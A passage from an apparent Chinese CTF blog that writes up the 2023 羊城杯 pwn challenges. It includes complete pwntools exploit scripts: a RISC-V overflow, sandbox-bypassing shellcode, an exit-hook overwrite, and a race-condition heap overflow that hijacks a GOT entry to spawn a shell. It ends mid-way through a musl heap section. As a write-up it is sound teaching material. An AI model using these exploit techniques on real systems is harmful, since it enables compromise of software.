AND HERE)</span></span><br><span class="line">    sem_post(&amp;full);  <span class="comment">// line p3</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">    sem_wait(&amp;full);  <span class="comment">// line c1</span></span><br><span class="line">    sem_wait(&amp;mutex); <span class="comment">// line c1.5 (MOVED MUTEX HERE...)</span></span><br><span class="line">    <span class="type">int</span> tmp = get();  <span class="comment">// line c2</span></span><br><span class="line">    sem_post(&amp;mutex); <span class="comment">// line c2.5 (... AND HERE)</span></span><br><span class="line">    sem_post(&amp;empty); <span class="comment">// line c3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, tmp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  sem_init(&amp;empty, <span class="number">0</span>, MAX); <span class="comment">// MAX buffers are empty to begin with...</span></span><br><span class="line">  sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">// ... and 0 are full</span></span><br><span class="line">  sem_init(&amp;mutex, <span class="number">0</span>, <span class="number">1</span>);   <span class="comment">// mutex=1 because it is a lock</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 羊城杯</title>
      <link href="/2023/09/07/2023-ycb/"/>
      <url>/2023/09/07/2023-ycb/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1_1KIhSyo5p8qDfCraXSh5Q">https://pan.baidu.com/s/1_1KIhSyo5p8qDfCraXSh5Q</a><br>提取码：n05i</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>risc-v pwn，给了后门，可以用cat fl*绕过</p><p>size_t的sVar1被byte截断存在溢出，比如0x107被byte截断0x07</p><p><img src="/2023/09/07/2023-ycb/image-20230907232659311.png" alt="image-20230907232659311"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;riscv&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io=process([<span class="string">&quot;qemu-riscv64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/riscv64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])#调试</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-riscv64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/riscv64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])<span class="meta">#</span></span><br><span class="line"><span class="meta">r = lambda x: io.recv(x)</span></span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = lambda x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">def find_libc(func_name,func_ad):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    global libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">256</span></span><br><span class="line">backdor=<span class="number">0x123456ee</span></span><br><span class="line">payload=flat(padding,backdor)</span><br><span class="line">sa(b<span class="number">&#x27;</span> name:<span class="string">&#x27;,b&#x27;</span>gr<span class="number">&#x27;</span>)</span><br><span class="line">sa(b<span class="number">&#x27;</span>words<span class="number">&#x27;</span>,payload)</span><br><span class="line">sa(b<span class="number">&#x27;</span>exec<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>cat fl*<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>开了沙箱，限制了read的fd要&lt;&#x3D;2，write的fd必须大于2，所幸可以使用dup2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020</span><br><span class="line">0005: 0x15 0x0d 0x00 0x00000002  if (A == open) goto 0019</span><br><span class="line">0006: 0x15 0x0c 0x00 0x00000021  if (A == dup2) goto 0019</span><br><span class="line">0007: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0013</span><br><span class="line">0008: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line">0009: 0x25 0x0a 0x00 0x00000000  if (A &gt; 0x0) goto 0020</span><br><span class="line">0010: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0019</span><br><span class="line">0011: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line">0012: 0x25 0x07 0x06 0x00000002  if (A &gt; 0x2) goto 0020 else goto 0019</span><br><span class="line">0013: 0x15 0x00 0x06 0x00000001  if (A != write) goto 0020</span><br><span class="line">0014: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line">0015: 0x25 0x03 0x00 0x00000000  if (A &gt; 0x0) goto 0019</span><br><span class="line">0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020</span><br><span class="line">0017: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)</span><br><span class="line">0018: 0x25 0x00 0x01 0x00000002  if (A &lt;= 0x2) goto 0020</span><br><span class="line">0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0020: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>可以执行我们输入的shellcode，最长17个字节，shellcode范围在[0x4F,0x5f]，但是最后一bit shellcode没有检测</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x14F2&#x27;)</span></span><br><span class="line">sa(<span class="string">b&#x27;no)&#x27;</span>,asm(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rax#fake padding</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax#0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi#0x7ffd451d99c0 ◂— 0x50f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi#0</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rdx#0x50f</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br><span class="line">sa(<span class="string">b&#x27;===\n&#x27;</span>,asm(shellcode))</span><br><span class="line">orw_dup2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall #open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,0x21</span></span><br><span class="line"><span class="string">mov rdi,0x3</span></span><br><span class="line"><span class="string">mov rsi,0x2</span></span><br><span class="line"><span class="string">syscall#dup2(3,2)</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall #read(2,rsp,0x30)</span></span><br><span class="line"><span class="string">mov rax,0x21</span></span><br><span class="line"><span class="string">mov rdi,0x1</span></span><br><span class="line"><span class="string">mov rsi,0x5</span></span><br><span class="line"><span class="string">syscall#dup2(1,5)</span></span><br><span class="line"><span class="string">mov rax,0x1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdi,0x5</span></span><br><span class="line"><span class="string">syscall#write(5,rsp)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>+asm(orw_dup2))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p> qword_201040里含有残余的unsortedbin，程序具有任意写，可以利用偏移确认ogg，写exithook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x9A4 &#x27;)#3</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ABC&#x27;)#exit</span></span><br><span class="line">ogg=[<span class="number">0x45206</span>,<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line">code=flat(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">7</span>,<span class="number">0x3c3b78</span>,<span class="comment">#libc_base</span></span><br><span class="line">    <span class="number">6</span>,ogg[<span class="number">3</span>],</span><br><span class="line">    <span class="number">1</span>,<span class="comment">#*(_QWORD *)qword_201040=ogg</span></span><br><span class="line">    <span class="number">7</span>,ogg[<span class="number">3</span>],</span><br><span class="line">    <span class="number">6</span>,<span class="number">0x626f48</span>,<span class="comment">#exit_hook=qword_201040=ogg</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sa(<span class="string">b&#x27;code:&#x27;</span>,code)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>多线程堆题，每个操作都会起一个线程</p><p>每个paper会分配一个0x10管理结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">paper</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *content_ptr;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>edit里存在条件竞争导致的堆溢出，如果此时edit paper-&gt;len&#x3D;0x68大小的paper，sleep期间，这个paper被释放，并申请了一个长度为0x58大小的paper B，paper B就可以造成0x10大小的堆溢出，可以覆盖掉下一个paper C的管理结构控制content_ptr实现泄露地址和任意地址写</p><p><img src="/2023/09/07/2023-ycb/image-20230908171035483.png" alt="image-20230908171035483"></p><p>子进程分配堆时，在页开始的0x8a0处是指向main_arena的指针，可以用来泄露libc</p><p><img src="/2023/09/07/2023-ycb/image-20230908172332090.png" alt="image-20230908172332090"></p><p>strtok函数会调用strspn_sse42函数</p><p><img src="/2023/09/07/2023-ycb/image-20230908181202295.png" alt="image-20230908181202295"></p><p>strspn_sse42的got是可写的可以劫持为system</p><p><img src="/2023/09/07/2023-ycb/image-20230908181402318.png" alt="image-20230908181402318"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;1 &#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;3 &#x27;</span> + <span class="built_in">str</span>(index).encode() + <span class="string">b&#x27;:&#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;4 &#x27;</span> + <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, <span class="string">b&#x27;2 &#x27;</span> + <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x14CB&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1955&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1509&#x27;)#mallco</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1667&#x27;)#delete</span></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x62</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">0x60</span>+<span class="string">b&quot;\xa0\x08&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&quot;b&quot;</span>*<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&quot;c&quot;</span>*<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;nt: &#x27;</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-<span class="number">0x219c80</span></span><br><span class="line">p(<span class="string">&#x27;libcbase&#x27;</span>,libc_base)</span><br><span class="line">system=libc_base+libcelf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sl(<span class="string">b&#x27;1 &#x27;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x60</span>+p64(libc_base+<span class="number">0x219058</span>-<span class="number">0x50</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span>)<span class="comment">#3</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x50</span>+p64(system))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>2.35 exit前加锁函数变为了pthread_mutex_lock，存储在 ___rtld_mutex_lock中，但是这个地址不可写了</p><p><img src="/2023/09/07/2023-ycb/image-20230908183549480.png" alt="image-20230908183549480"></p><p><img src="/2023/09/07/2023-ycb/image-20230908183435298.png" alt="image-20230908183435298"></p><p>或者可以改elf的link_map-&gt;Elf64_Addr l_addr使.fini变为ogg</p><p>或者可以通过environ泄露栈地址，通过偏移修改返回地址为ogg</p><h2 id="cookiebox"><a href="#cookiebox" class="headerlink" title="cookiebox"></a>cookiebox</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/2/c/t/P/cookieBox&gt; ./libc.so</span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.1.24</span><br><span class="line">Dynamic Program Loader</span><br><span class="line">Usage: ./libc.so [options] [--] pathname [args]</span><br></pre></td></tr></table></figure><p>1.1.24 musl pwn 这篇文章比较详细 <a href="https://www.anquanke.com/post/id/202253">https://www.anquanke.com/post/id/202253</a></p><p>patch方法</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./libc.so ./cookiebox</span><br></pre></td></tr></table></figure><p>delete时存在uaf可以，虽然在edit和show时还有个大小检测，但是利用之前残余的指针来释放现有的堆，绕过这个大小检测</p><p>申请过程中有类似glibc中unlink的操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/malloc/malloc.c L188-L213</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span><span class="comment">//c为要取出的堆</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 若 bin 只有一个 chunk，将 bin 设为空 bin</span></span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">// 取出链表中的 chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// 设置 INUSE 标志位</span></span><br><span class="line">    